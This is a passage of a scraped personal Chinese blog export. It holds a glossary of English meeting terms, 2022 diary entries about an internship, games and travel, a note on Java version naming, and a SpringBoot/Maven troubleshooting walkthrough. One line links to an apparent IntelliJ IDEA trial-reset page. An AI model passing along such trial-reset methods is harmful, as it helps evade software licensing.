center，虽然翻译为会议中心，其实都是既有超大的会议设施，也有配套的展览设施的。这也是美国的特色，协会社团做大了会议之后，往往做展览，convention满足了这个形式和需求。欧美的convention bureau(会展局或会议局)更关心的是会议，这与国内不一样。\nPlenary or General Sessions-主论坛：就是一个大会（含商业类和行业类）所有代表均要参加或必须参加的会议，一般是在开幕式之后紧接着进行的。在协会社团和政党会议之中，又称为General Assembly（全体代表大会）。Plenary or General Sessions是与concurrent session or parallel session 相呼应的，在主论坛之后，通常是平行分论坛，同时几个会场分别召开专业细分的论坛。\nWorkshop-研讨会、工作坊：原意是车间的意思，既然是车间就一定有师傅和学徒。很多知识是默会的知识（只能意会不可言传，比如手术技巧、骑车、画画等），默会的知识传递需要手把手的示范，这就是hands on workshop的由来（hands on就是手把手，师傅拿着土地的手来示范）。因此，workshop通常是实操性的培训班、操作演示、培训示范，规模较小。\nSymposium-研讨会：要指专题性的学术会议，设定一个主题，然后每位演讲人/发言人轮流上台发言，每人从最短5分钟到30分钟不等，演讲形式也称为oral presentation 或oral session，与poster presentation和poster session相对应。这个词据说在拉丁文、希腊文原意是知识阶层的酒会，会后还经常有一个晚宴。到了18世纪，用来指称关于某个主题的会议。\nSeminar-讲习会：讲授性质的学习班，这个在校园内举办的讲习会、研讨会比较多。话题更聚焦，就某一领域特定的问题（或者是老师布置的一道作业）进行研讨，寻找结论。在大学里面申请研究生的机会，需要考察你主持和参与的seminar的能力和研究成果。据说是源自德国19世纪的“由一位教授带领的学生研究组”，所以在今天也多指培训性质的研讨会。\nRound-table-圆桌会议：就是不分席次以示平等协商的会议，起源于圆桌骑士。百万圆桌会议(The Million Dollar Round Table, 简称MDRT)是全球寿险精英的最高盛会，成立于1927年，当时32名销售业绩在百万美元以上的寿险营销员希望组成一个论坛，致力于扶植高标准的寿险销售概念，树立寿险营销人员的形象。\nPanel-专题小组讨论会：一般是行业或专业论坛，就某一话题，由一名主持人或促进员（moderator/facilitator）主持，3-6名讨论嘉宾参与讨论，主持人就某一话题引发话题，引起嘉宾进行对话、探讨。在学术领域，也可以是由一些专家组成panel，对候选人或者及其演讲进行评议和答询。\nForum-论坛：这个词用的很广，在行业会议之中过比较多，在政治领域通常是讨论大众关心的问题，形式上可以有panel和keynote等形式。\nDialogue-对话：对话这种形式在电视节目之中用的比较多，通常有一名主持人，由2方或多方就一个问题进行协商沟通，所谓对话与panel的区别在于，对话需要协作解决问题。中外对话（China Dialogue Trust）成立于2008年，总部位于伦敦。气候变化、海洋保护、生物多样性保护以及生态文明建设不仅仅局限在某一国之内，也是全世界所有居民都要探讨的议题。\n**Summit-峰会：**一般都是行业大佬、政治精英（特别是国家元首，最差也是部长级领导人）参加的会议，才能称为峰会，总之就是精英的聚会，在于参加的人的身份级别较高。但如今，峰会有泛化滥用的趋势，一个展会里面也可能搞一个峰会，请了几个公司总经理级别的人参加就是峰会。\n**Conclave-闭门会：**这个词用的比较少，conclave来源于法语，具有宗教意味。在英国最佳罗伯特·哈里斯的作品Conclave（翻译为秘密会议，闭门会议）之中，教宗逝世后，西斯廷教堂紧闭大门，来自全球各地的红衣主教将为世界上最秘密的选举投票。A conclave of cardinals was held to elect the new Pope. 红衣主教团举行了秘密会议来选举新教皇。我第一次知道这个词是从长海医院普外科已故教授郑成竹这里知道这个词（第四届亚太地区减肥手术会议）。\n**Colloquium-学习报告会：**该词源于拉丁文“colloquium对话”。通常指比较专业的学术讨论会议，在暑期学习班、学术休假之中比较多。邀请某一领域的专家，专业人士参加，与会者将表示他们在特定领域的思想和看法，属于非正式不定期会议，不用穿正装，会议室也不必是正规严肃的会议室，师生均可参加，大家联谊切磋比较常见，有点华山论剑的意思。第一次知道这个词是东华大学的刘校长举办时装研讨会fashion colloquium。也有的场合写作Colloquy，具体不清楚两个词的区别。\n**Committee meeting-委员会会议：**committee是协会和政党以审议或处理特别的问题而成立的组织，如专家委员会、常务委员会、指导委员会、组织委员会、学术委员会、财务委员会、后勤委员会等等。委员会会定期举办会议，叫做Committee meeting。\n**Council meeting-理事会会议：**council是协会、NGO组织成立的有任期的咨询或立法组织，如联合国安理会、经社理事会等。理事会也会定期举办会议，进行改选。\n**Board Meeting-董事会会议：**注意不仅企业有董事会会议，协会也有board。\n**Function-功能活动：**通常是组成一个大型会议的一些列活动，比如开幕式、午餐、晚宴等。在会议中心，有function space的说法，即会议功能区域划分。\n**Social Event-社交活动：**是会议的配套活动，通常是联谊性质的会前会后游览活动、考察活动、晚宴活动、为参会的配偶子女们安排的活动，在国际性的学术会议之中比较常见。\n**Unconference-非会议：**非会议是一种议程由参与者推动并创建的会议。会议的筹备一般不是由某个单独机构或一小群机构组织的，具有很明显的互联网时代，去中心化的特质。随着Web 2.0和开放空间的兴起，这种模式充分体现了开放、平等、自由——召唤大家来参加的是对于主题的热情与责任感，贯穿其中的就是参与者自发性的感受到思想激荡的主题。会议没有嘉宾贵客，不设主旨发言，没有规定的休息时间、茶点时间，整个会议里面充满自由开放的气氛，每个人在各个时刻都知道他/她在这个会议当中是自发性的选择。比较常见的The World Café-世界咖啡厅就是非会议的一种类型。具体请见，非会议是什么？\n**Asynchronous conferencing-异步会议：**这个词是疫情之后诞生的新词，是指在虚拟空间，线上会议永远持续，但是参会人并不是所有人都同步在线的会议形式，具体请见：Asynchronous异步会议是什么。\n**Webinar：网络研讨会：**这个词十年前就有了，疫情促进了这个形式的进一步普及。\n**Pow Wow-部落聚会:**本义是指北美印第安人的集会，聚会，带有祭祀、狂欢、庆祝的意思。\n**Synod-宗教会议：**具有宗教性质的会议，比如，惠比特会议（Synod of Whitby），也称惠比特宗教会议。公元663年，诺森布里亚国王奥斯维根据罗马习俗在该会议上确定了复活节的具体日期，以此为标志，英格兰的教会才一致承认罗马的权威。\n**Parley-讨论或会议：**尤其是在停火或其他问题上在敌人之间进行的讨论或会议。据说这个词源于法语parler，“说话”，因此具有军事意味。\nCaucu-决策会议：（政党或组织的）决策层（会议）；利益集团（会议），源自美国俚语，是由州内的政党领导人召开的基层会议，讨论竞选策略，并挑选出他们在政党的全国代表大会上所支持的侯选人。Caucus这个词来自阿尔冈昆印第安语原意是“部落里的贤者，” 也就是专门为他人指点迷津的人，相当于现代社会的咨询顾问。\n搬运：https://cn.linkedin.com/pulse/%E5%85%B3%E4%BA%8E%E4%BC%9A%E8%AE%AE%E5%AF%B9%E5%BA%94%E7%9A%84%E8%8B%B1%E6%96%87%E5%90%8D%E8%AF%8D%E8%A7%A3%E8%AF%BB-stacey-china-exhibition-contractor\n","date":"2023-04-02T22:39:05+08:00","permalink":"https://proben1.github.io/2023/%E8%8B%B1%E8%AF%AD%E5%8D%95%E8%AF%8D%E4%BC%9A%E8%AE%AE/","title":"英语单词(会议)"},{"content":"2022.9-10\n10.31\n深渊12层满星，自力更生。\n明日方舟音乐会！！！！！！\nJameson到了，喝起来有种枫糖的香味。\n我觉得自己在这点上特别幸运，因为是那种喝完酒变会得十分开心的类型（提醒自己适度）\n10.20-10.27\n找老师，看paper。大三要自己找隐藏NPC喽~\n用了莱茵生命主题的PPT在网协宣讲会上，有意思的是，安全讲到一半被超管把直播给ban了，效果拉满。\n无线课设：发现了电信工程及和管理专业的本质：通信工程，工程，工程………………\n和大二的学弟学妹一起面大一的学弟学妹，还挺有意思的。\n10.14-10.20\n新坑《深海迷途》《灵境行者》\n体会到了在隔壁宿舍五黑的感觉，爽！\n这俩月一直单曲循环《hollow hunger》\n开始记忆五十音图\n收到了招商银行的小破站信用卡，决定不开卡一直到……永远\nNovaAI，绘画，试了一下，挺好玩的。感觉发明了元素法典的人们也太强的吧。\n原图是我和一只二哈的合影，森林法改造后：\n10.11\n学校交接返校学生成功达成模块化：各卡各的。收获三天西游宾馆暂住卡一张。\n顺便纪念一个纸杯：24h服务处一个带有黄色笑脸的纸杯，为了寻找它，我绕着西安机场整整走了一圈。\n《The Witness》留声机挑战达成。\n10.10\n办理离职，安利西安路早上一家便宜好吃的蛋饼。暂时告别了挤地铁的生涯，下午自己买了东西去大妈家看看，晚上的飞机，走了。ps：飞机低空飞，神州大地上的夜景很美。\n《关于我早上还在西安路吃早餐然后晚上就到了西安这件事》\n九点15起飞，大连全景清晰可见，进入渤海，航标星星点点，让我想起今天下午大大给我说的话。\n飞机飞了低空？还是没有云彩？又或是时间正好？反正这是我乘坐飞机以来，第一次从飞机上完全看清灯火。\n9点20，可以看到山东省的海岸线，这时还在将军石咀，视距大概在20-80公里之间，方向东南。10分钟，飞穿渤海出口，山东省的海岸线连成一排。很快，飞机转向，又变成蜿蜒的一列，一直一直到远方。左侧是龙口市，低空看，灯光如同天地棋盘，正方形，一条线，又是一个正方形。每五分钟经过一个城市，在我打这段话的时候，已经顺着海岸线到了莱州斜上空。最震撼的是，海岸线无线延伸，远望内陆也无限延伸，两个方向，灯火不断。又是一次转向，飞机要离开海洋，方向直线东营。此时左侧有个片巨大的灯火，应该是潍坊。\n飞机在东营上空，我可以透过发动机和机身的缝隙里看到下方的颜色，也是方方正正的橙色灯光。这是向大陆望，或白，或黄，或红的灯光遍地，如同银河中的星星。21:40\n不出意外的话，再过10分钟我就能看到济南的灯光线，再过20分钟我就可以完整看清济南的夜景，星期一22:00的济南。（飞机现在在滨州上空）\n飞机顺着黄河飞，可以看到前面是一大片的橙海，和完全高空的俯视不一样，我可以看出楼与楼不同的高度，每条如同血管般的车道，不同颜色的霓虹。好像荧光海，但这是大地啊。21:52，我的左侧，是济南和黄河。21:55，济南从我的视野里消失。我不能向后望，因为机翼挡住了了后面几乎全部的视野。\n满足了我的愿望之后，飞机继续进行一个小小的转向，这时基本就是直向西安飞去。接下来我可能会望见聊城，安阳，焦作，洛阳，商洛，可能没有像沿着海岸飞的那么震撼，但也是时不时看到一个城市的灯光，从前，到后。我想在安阳拍个照，等下飞机发给家在安阳的舍友。自辽宁出发，途径渤海，山东，河北，河南，山西的航班，最后会到达陕西，并在23:30降落于西安咸阳机场 。\n（途中因为一个机翼的小调整，让我看到了邯郸，图案好像一个《见证者》里的谜题）\n10.9\n早上，下雨刮风，懒洋洋的在被窝里躺了一会，是我最喜欢的时刻。这时候如果打开《上古卷轴》或者《我的世界》将是一手绝杀，可惜打不得。\n10.1-10.7\n十一假期，尽管我周围好像很多人没有十一假期，甚至于我也没有十一假期hhh。\n回了一趟老家，顺便完成实习的最后一天任务。\n完成了一次《赛博朋克：红》的跑团。\n也是服了，冬装一件都没带回来，当时也不知道，放个暑假我要带一冬天的衣服。\n新的阶段开始了，小子！\n在回学校之前，需要对校内知识，数学英语按部就班进行学习，还有继续技术性知识的学习。\n顺便宣布！重启做饭模式！\n9.25-9.30\n打离职了，果然还是要回学校的（两眼无光）。这三个月，真的很棒。\n（掏出深夜记的一段）\n这三个月，很棒的，开心了，也成长了，或者是成熟了。\n城市之巅，滨海海边，小酒馆，废弃大厦的顶端，\n找工作，面试，入职，练习，进项目，疫情，线上，离职。。。。\n炼狱小镇，跑团，2077，见证者，大表哥 神原 ，水月肉鸽，须弥，kenshi。。。\n高数，单词，网课。。。\n莉可丽丝，边缘行者，重生帝国，overlord4，\n我感觉，反正就是一些无形的感觉，自己变得不一样了，真的\n不管咋说，现在又是进入了一个新的阶段，去吧！\n===========\n《水月与深蓝之树》\n《overload4》，嗑一手小公主和小骑士\n《Lycoris Recoil》\n9.24\n好！\n9.17-9.23\n精分，但是没完全分……\n小学一手算工资：\n​ 实际出勤+法定节假日\n月薪x \u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;-\n​ 一共要出勤的+法定节假日\n=========================\n《Cyberpunk Edgerunners》\n《2077》白金\n9.11-16\n仍然在精分……VBA宏还挺有意思的，刷新了我对Excel的认知……\nCSGO?太专业了，预瞄，拉出，定位，急停……再来个暂停讲两句~\n还记得某天晚上研究方舟基建排班，很复杂的几个体系，感觉理明白可以写个小论文出来。最后还是因为脑汁榨干以及人物不全放弃了，一个开放性的谜题。\n9.6-9.10\n精神分裂时期，一边线上办公一边线上上课一边考研网课，顺便晚上再玩玩游戏。\n一个很有意思的事情……teams的头像是和Microsoft 365共用的，之前不知道这个事情。。。导致了我在Microsoft 365里传了个守林人顶替掉了teams的头像。很明显这样严肃的办公软件是不让使用动漫人物头像的，于是为了弥补这个错误我重新上传了一张巨尬的三次元头像。\n==========\n《大表哥2》\n《复活帝国》\n《森林书》\n9.1\nkinshi小记\n开局一人一狗，RPG硬是让我玩成了生存游戏。\n印象最深的还是流浪者的时候，一个卫兵追我，追到之后，给了我一块面包。。。\nps：九月份由于一些不可抗拒的原因，这些都是之后整理的。\n","date":"2022-11-20T16:54:59+08:00","permalink":"https://proben1.github.io/2022/%E8%8C%84%E7%A7%91%E7%94%9F%E7%89%A9%E8%A7%82%E6%B5%8B%E6%97%A5%E5%BF%972022.9-10/","title":"茄科生物观测日志2022.9 10"},{"content":"省流：java se6= jdk6+jre6\n历史原因\njdk1.6= jdk6\njdk1.8= jdk8\n以此类推，现在全都直接叫jdk+版本了，没有1.x、\n如现在Java SE 19，对应JDK19\nJava SE 8，对应JDK8，或者叫1.8\n维基百科可以直接查看：https://zh.wikipedia.org/wiki/Java%E7%89%88%E6%9C%AC%E6%AD%B7%E5%8F%B2\n另外是三个类型，可以了解一下：\nJavaSE（Java Platform，Standard Edition）Java标准版 JavaME（Java Platform，Micro Edition）Java微型版 JavaEE（Java Platform，Enterprise Edition) JAVA企业版 参考：https://www.jb51.net/article/214196.htm\n","date":"2022-11-20T16:21:00+08:00","permalink":"https://proben1.github.io/2022/java%E7%89%88%E6%9C%AC/","title":"Java版本"},{"content":"背景：需要跑一个web端的小项目，正好之前电脑重装还没下idea，顺手下了个。\n项目：https://github.com/TimVan1596/LightDisk\nIDEA 2022.2.3：https://www.exception.site/essay/idea-reset-eval\npart1 先从idea上连github把项目clone下来：https://blog.csdn.net/hry2015/article/details/77984399\n理论上这之后maven构建一下就可以了，结果构建之后运行出现了报错：\nCould not find artifact io.github.novacrypto:Base58:pom:2019.01.27 in central 遂上网搜索novacrypto:Base58，发现这个包是存在的，但是版本出现了问题。\n如图，在pom.xml中，默认的版本是2019.01.27，但是现在只有2022.01.17的版本，猜测更新的时候删掉了旧版本hhhh，重新修改后reload:\n\u0026lt;!-- https://mvnrepository.com/artifact/io.github.novacrypto/Base58 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;io.github.novacrypto\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;Base58\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2022.01.17\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 中间还出现了一次网络报错，切换一下线路即可。\npart2 运行com.timvanx.Application入口，启动Spring Boot项目，过程中出现报错：\n吃个黄豆糕冷静一下，一般来说，像这种框架出现报错，要么就是环境配置问题，要么就是别想解决了……\n我首先试着删除libraries中的依赖，然后使用maven中的clean来删除创建了的target，再用maven重新导入依赖，无果。\n看着readme中的环境要求，感觉可以用jdk1.8试一下：\n软件架构\nJDK 1.8+\nSpring Boot 2.0.1\n[Apache Gossip]\n我的版本是16，有可能不支持\njava -version java version \u0026#34;16.0.2\u0026#34; 2021-07-20 Java(TM) SE Runtime Environment (build 16.0.2+7-67) Java HotSpot(TM) 64-Bit Server VM (build 16.0.2+7-67, mixed mode, sharing) 到官网新安装了一个java8：https://www.oracle.com/java/technologies/downloads/#java8-windows\n在File-\u0026gt;Project Structure -\u0026gt; SDK中选择JDK1.8，Apply！（idea会自动检索到）\n重新启动后，成功！\n","date":"2022-11-20T11:30:30+08:00","permalink":"https://proben1.github.io/2022/%E8%AE%B0%E4%B8%80%E6%AC%A1springboot2%E6%8A%A5%E9%94%99%E6%8E%92%E6%9F%A5/","title":"记一次SpringBoot2报错排查"},{"content":"2022.8\n8.29\n学校开学，线上上课。\n疫情加重，公交地铁限流，同日下午改为线上办公。这下学时工时都凑上了。\n这就是我安心预习数学的好机会啊！\n8.28\n于杰家一天。\n有所思考。\n8.27\n和同事吃火锅，回家睡大觉，晚上学高数。\n发现人家 都 有 对 象 了。\n8.26\n文章维护：\n《怎么ping不了》修改了一些词语。\n开启了茄子观察日志的评论。\n处理了茄子观察日志中暴露名字的地方。\n《第一次面试经历》减少一些隐私暴露。\n反正我是今天才知道的：\n黑咖啡热量基本可以忽略不计。\nCtrl+Enter在Word可以换頁。\n”方” != “⽅”，第二个“⽅”是U+2F45康熙部首，同理石⽯魚⿂鱼⻥木⽊口⼝月⽉尸⼫土⼟日⽇虫⾍火⽕女⼥金⾦金目⽬山⼭人⼈衣⾐十⼗八⼋一⼀。\n学会了酒的分类和咖啡的分类。\n小小关注了一下软考和普通话。\n没想到对面老哥是网安专业的！！！我超了这个地方真的是卧虎藏龙，速速交流一波。啊啊啊好想找这方面的实习啊，心头痒痒。\nhvv面了过了没去真的好亏啊，疫情wdnmd。\n今天下午挑战了冷的美式咖啡，失败了。\n热的是中药。\n冷的是冷中药。\n喝了俩小时了，还剩一半，充分修复了无聊的bug，因为你的嘴里总有味道陪着你。\n冥思苦想15min想出了大学后两年最后缺失的拼图：一战没上岸怎么办？\n不脱产二战非全日制。\n某种程度上，在想出这条道路的瞬间，我的大学毕业了。\n很难想象我现在的大脑，如同无数星闪耀于其中，我已经给自己颁发了毕业证，某种程度上，我预测了两年的人生走向。\n（咖啡喝多了开始犯病啦）\n因为本周项目做的好而提前放学！芜湖！\n与英豪节操二人烧烤，饮酒摇骰，吟诗助兴。遂学会科目一正反手速开瓶盖且不崩，科目二倒酒过半而沫正好，科目三猜骰游戏，酒，杀！犯大吴疆土者，盛必击而破之！饮罢，又醉，朗诵苏轼《定风波》，打车归去。家门单杠引体向上，未果，波棱盖差点给我咯碎了卧槽，终见家门，倒于沙发之上。\n8.25\n今天六级出分！过500啦，够用了！太棒了，直接和四六级分手了。哈哈哈，虽然想要复合也复合不了。\n下午带薪看Go，巨开心。\n8.24\n上周最后录入数据的时候一个Flip4被我打成了Filp4，躲过了我和QA姐姐以及final check们的重重法眼，被韩国那边发现了。\n我估计是那边的技术人员一导数据库就看出来了，但在我们这边需要手工+人眼，有点像人工队对战机器队。。。\n还是比较严重的（从该职业性质来看），幸亏我是实习没啥可扣的，QA姐姐一定扣绩效了hhh，中午给人家买了奶茶，还好TL没公开处刑，只是说了组里有人犯错，让组里其他人double check，而我在改错。最后我改完了看同事们还在干，主动帮他们检查，所以同事眼里就是莫名因为一个大冤种多了一堆活，而我则是一个小天使（实则偷偷戴罪立功）。我现在在想周会的时候迟早社死怎么办呢hhh。以后要注意啊。\n知乎上摘的：\n无论上学的时候多牛逼，专业学校成绩能力分分钟把别人秒成渣，工作后基本都是每天重复简单的内容，平心静气脚踏实地做好本职工作，不出错，就太tm牛逼了。\nps:下班前又因为离开座位电脑没锁被批评了。\n纪念一下，今天是第一次在晚高峰的地铁上抢到座位。能在这里坐下闭眼很重要，我刚刚伤害了自己，又治愈了自己。\n8.23\n摸鱼时间从头阅读了一遍互联网发展史和网络安全发展史，仍然感到心潮澎湃。\n.\n8.22\nCrazy Monday.\n下班头昏眼花，抽空看了下路由算法。\n8.21\n周天，和贾爆逛，叙旧，迎新。\n裕景ST2空中有个巨赞的咖啡厅，20年以来第一次认真看了大连全景。\n海之韵走到棒棰岛，中途路过一个网红景点，遂下山到海边看看。没想到这里早就被悬崖落下的巨石砸了个稀碎，破到没影的木栈道和满缝隙的玻璃碎片，没有任何阻拦，很多游客无视警告直接踩石头上到台上拍照，最可怕的是台子上的悬崖正好卡了一块巨石！！！遂赶紧逃离，走的时候心脏怦怦跳。\n棒棰岛景区因为不可言说的原因今日封闭，晚上回到火车站慢慢溜达。\n一天下来步数3.5W+\n8.20\n又又又梦见环了：\n我在山上俯瞰湖之耶利尼亚，景色一直一直延伸到远方的黄金树。\n屋子里换了个桌子，把老橡木桌子换成了个转角桌，双模，正面是书，转个身就是电脑。\n晚上小聚，叒被骗了，本来说遛弯的，结果蹦出来俩cdz。遂商场飙车购物车。\n建国意式英语，结账：make a deal。together：拖该打。给外国小哥干懵了。\n8.19\n。。一个电梯装了一个项目组的人\n氪了幺九八\n蒂蒂带回家\n8.18\n工作量1，羞愧难当，以至于我向QA主动请缨。\n来思考思考人生，半个月前还在怀疑一个假期干这个有什么意义，这不就出来了嘛。\n首先是职场难度，我直接打0分。\n没有勾心斗角，利益冲突，大家和谐相处，都是大学生/研究生，teamleader是小姐姐，最小的QA+技术支持还是个00后。\n工作难度，我只能说难在细心。\n工作内容，早九晚六，想加班都没机会。唯一闹心的就是通勤来回2h。\n收获，薪资，经验，技能，为人处事，自身独立性/认识/规划\u0026hellip;\u0026hellip;.等成长，充实简历，全英文环境体验，外企待遇体验（只不是），家庭地位直线上升（乐），爷爷奶奶开心，更多的朋友！稳定的工作内容以及小姐姐，挤地铁等级提升，以及更少的同学聚会，省下更多的CNY！\n可能是知道自己能呆在大连的时间越来越少了，更想在这个城市流连，高楼，海，日出日落，夜跑，夏秋交际的风，想认识更多的人，自己也越来越不优柔寡断，越来越不懦弱。\n焦虑来源于和同龄人的对比，我要把他变成动力，想办法更好的利用身边的资源，珍惜身边的大牛啊啊啊，也不吝啬去帮助需要帮助的人。\n未来什么的，怎么可能按着我的想象来，这是我完美主义的大劣势，但我有着并不充足的预案以及一颗半金刚的半玻璃心，可以适应一切的生存环境，接受一万种结果，生活下去，甚至经常感到幸福。\n所以说啊，我觉得我和一年前的自己已经有了代沟了。\n最后，这段时间虽然都在成长和学习，但要提醒一下自己别忘了学技术。\n8.17\n工作量10，被领导安排了至高无上的练习。\n18\u0026ndash;21点的直播课，也没多想，下班就开看，电梯看，吃饭看，地铁看，楼道看，一直到家看，显得我像个傻子。\n后来一问有录播，原来我就是个傻子。\nemo了，22年的录取通知书真好看，想想我的，一张纸。找不到了。\n8.16\n工作量4，差点闲死。\n8.15\n工作量14，差点累死。\n8.14\n因为一场雨而邂逅了一杯咖啡\n然后被美式咖啡薄纱\n加了焦糖后被两个一起薄纱\n我不否认它很香\n但我也不否认咽的时候总会联想到在咽中药\n。。。然后又因为同一场雨又邂逅了一碗大肉面\n8.13\n好久没有和爷爷奶奶聊的这么开心了，他们知道我在实习就一直笑，我还给他们看了食堂的饭，能看出来，他们很高兴。\n下午见证了一场史诗级的讲价22800到18500。\n晚上和宁张韩去吃饭，第一次西餐吃到四位数。。。\n每次去清吧都感觉坐不够，都被朋友催着走哈哈哈，可能是比较喜欢这种安逸的感觉吧。一群老外甚至在里面降下了显示屏看球赛，另外俩在拿手柄打电视上的双人像素游戏，看着一个程序员模样的在帮他们调设备和屏幕，我突然好奇他们和家里人在网上联系是不是也需要科学上网呢？还有就是没想到只去过一次老板娘就认出我了hhh。\n半夜没赶上101的末班车，打个的回家，路上竟然追上了哈哈哈。\n8.12\n每日任务（1/1）：帮助学弟找到迎新群\n隐藏成就（1/1）：直接把学弟入坑网安\n奖励：三年后的大腿x1\n时间好快啊，不知道什么时候发现，我自己能像别人指导我一样去帮助学弟学妹了。\n他们的豪言壮志，青春与梦想，也能够激励到自己。\n但就是很可惜，这些年有些事情不尽人意，虽然不能说是遗憾，但每次想起时都会心里难受。就这样吧，不断向前走，希望再回头看时，这些已经变成了豪哥口中的“小问题”。\n8.11\nPart1\n这个我必须说一下，今天是，明日方舟夏活！！！！\n（143~153）\n一共153抽，歪了两个空弦，一个傀影。。。最后的十连，直接从0到毕业。\n发牌员！你顺序错了啊！！！\nPart2\nTo myself:\nIf you love someone, set them free. If they come back they\u0026rsquo;re yours; if they don\u0026rsquo;t they never were.\n8.9\n早高峰，西安路，站内人潮汹涌。\n到我上车时，地铁刚好满满当当。\n一位姐姐向后挤了挤，出了块4dm²的空地，然后抬头看着我。\n周围的人已经止步，他们选择下一班列车。\n一弹指六十刹那，一刹那九百念生。\n少年要在九百念中做出抉择。\n低头，手机，北京时间8:22。\n挤门上和下一趟。。。。\n最终还是选择了挤门上。\n8.9\n摸鱼在看Python连Excel和Excel的宏。\n发现即使下班做40min地铁回家也不累，还能在家门口做三组引体向上，晚上还能和朋友开三局CSGO哈哈哈。\n充实满足的一天。\n大连，24℃。\n从早上企图在早高峰坐公交上班，最后算着算着来不及了，赶紧下公交转地铁，顶着小雨跑到单位；再到中午盆比我脸大的土豆泥黑椒牛柳捞饭。从下午task被QA狠狠地点评；到下班后特地去海边吹清爽的海风，远望小平岛。晚上汉堡王皇堡里的酸黄瓜，纸杯里的大冰块；在清吧和好友一聚，聊天＋瞎侃，安逸的环境让我错过了地铁，却是有幸赶上了101的末班车。\n难得有些期待。\n期待8.10的Apex新赛季和新传奇，还有三星Z4系列发布；期待8.11的明日方舟夏活；期待着开工资，期待能把中国转转，能去世界转转。\n8.8\n难得内热而外冷的夏日，不腻的凉风从4楼的窗台向我吹来。上次这种感觉是在一年前的深夜，读到秦淮，紫峰大厦和月牙湖。深夜中总是有一些让人怦然心动的东西，或是人，或是地，或是物。\n少年应酒剑随马，落子无悔。愿桃花赏尽，问心无愧。\n三个让我心动的事\n一是参与重保（演习）\n二是南京\n三是zc\n8.7\n重建戴森球，人人有责。\n8.5\n今天才发现当时面试两个人一个是manager一个是teamleader。。。哈哈哈而我当时的判断是一个HR一个实习小姐姐。\n8.4\n我本来以为我的医生会按照定了轨迹走。\n但实际上如果你不断去尝试新的东西，你不断去接触新的人，新的事物，新的技术。你会发现你仍然是一个从头开始的自己，你的前方道路无限选择，无限延伸。你不会因此而变的故地自封，你会充满希望，勇往直前。\n8.3\n入职\n小小的公司真是卧虎藏龙，员工各有千秋，不好说。\n回家电视欠费了，帮老爸摆弄电视。之前一直没有搞清家里电视为什么连不上网，最后发现是因为我的WiFi名称，也叫ssid，用了汉字，不支持，最后我给改成英文的了，好了。又研究了下DLNA怎么用，可惜我20多G的指环王太大，放不了。\n最后和老爸一起看血战钢锯岭，好久没有这种充实的感觉了。\n8.2\n签合同\napex救世主赛季通行证打满啦！\n金总又帮我凹了深渊12满星！\n每半个月就要被保全驻派折磨一次！\n8.1\n裸考科四，过啦！现场听课，宣誓，领证，记得六年后去体检哈。\n","date":"2022-10-09T10:32:10+08:00","permalink":"https://proben1.github.io/2022/%E8%8C%84%E7%A7%91%E7%94%9F%E7%89%A9%E8%A7%82%E6%B5%8B%E6%97%A5%E5%BF%972022.8/","title":"茄科生物观测日志2022.8"},{"content":"2022.7\n7.31\n今天习惯性开CE造戴森球，结果被检测ban掉了。。。\n重建！重开个档！\n这次要让总线魔教和超市大法遍布星系！\n顺带一提，今天终于冲出来了完美的藕粉，没有疙瘩那种。但是好像没有疙瘩会失去灵魂？\n重装电脑之后艾尔登之王存档没了，只剩硬盘里的二周目和steam云存档的一周目打50h的档。和杰杰互刷99王之卢恩，然后重启登基之旅。\n7.30\n只狼-白金完成\n最后来来回回打三次了一心，实在顶不住了，直接风灵月影。。。叮！\n五指毛桃煲土茯苓猪骨汤，我只是今天碰巧听了这个名字然后记一下而已。\n“晚上吃啥呢？”\n“电弧星。”\n7.29\n还是得看《素晴日》，二刷也能乐哈哈。\nConcentrix 面试，简历筛过了之后应该就一面。\n出地铁一路上9个扶梯。。。\n二个面一个，主要是男HR在和我聊。\n开始是一个英语的自我介绍\n.问了爬虫..爬虫的法律\u0026hellip; Html\u0026hellip;\n科学上网..还有思科的网络证书，正版软件意识这些\n之后就是简单聊了聊工作内容以及安排。\n反问的时候我确认了下时间，问了下餐补以及加班等等\n最离谱的是我Html的table标签竟然忘了，我说一块一块的叫啥来着，出来的时候查了一下原来叫表格。\n早上进来的时候不用门卡，现在门锁了，出不去了，绕了几圈从车库出去了hhh\n家门口卖的辣白菜怎么这么好吃啊\n原来角瓜也叫西葫芦啊\n7.28\n《Everhood》通关\n炫光，节奏，不知道什么类型的音游，晚上关灯玩这游戏就和进了夜店差不多。\n（剧透警告）主角帮助这些永生者解脱，也不知道是不是自愿hhh虽然大家最后还是感谢主角的。\n超度绿法师和最终关两个关卡十分Nice，音乐，游戏性，背景都很到位。通关之后还能进行自定义关卡。\n《只狼》通关\n早上把everhood打完心里就来瘾了，想打铁，打铁。遂打开了一个半月没碰的只狼，没想到打着打着就到结局了，砍完一郎蹦出来个一心我是没想到的，一心二阶段还有五连火铳也是我没想到的。什么只会挥砍的男人啊，这明明是个武器大师好吗？！\n从早上一直到下午，死磕苇名一心啊，最后还是入了风灵月影宗，打了个龙之归乡结局，才能一点钟吃上早饭。没砍爽，找个时间接着砍。\n7.24\n把完结的番补一下。\n《间谍过家家》\n《辉夜3》\n开仨新坑\n《莉可丽丝》\n《Overlord4》\n《金装的维尔梅》\n7.22\n科三考试！大连体育中心考场。两遍过，太刺激了。\n第一遍刚要出车的时候，大货车旁边右边跟一个摩托车，根本看不见，被教官直接喊停了。然后抱着不知道什么心态，最后第二遍过了。\n每月农行随机立减，这个月给我爆了10元的金币。\n7.21\n开箱大地球滑步。。星使没了，wdnmd。\n深夜の战术研究科目三地图。\n7.20\nApex危险武装活动，碎片西部已然化身二战斯大林格勒。\n7.19\n明日方舟故事集《未尽篇章》，守林人打远程太无敌了，1.5倍加成，两个炸弹重叠的话就是，普攻+7000x2+普攻。常态＋斯卡蒂唱歌是1500，炸一下4500，4500x1.55刚好快7000。\n开始科三康复训练。\n晚上吃了大碗冷面。\n7.18\n。。。nhr他们KTV，五个人，但是是我一个人包场，把拜年祭V家的歌全唱一遍，在我开始单刷许嵩全曲的时候才到时间hhh\n下午吃饭我无师自通了：烤梅肉+意大利面肉酱+小姜秘制酱料+包菜叶的神奇料理。\n金总第一次帮我打了深渊12满星。\n7.17\n和建国简蛋去IKEA，终于满足了意大利面和瑞典肉丸的愿望。\n可惜没有蔓越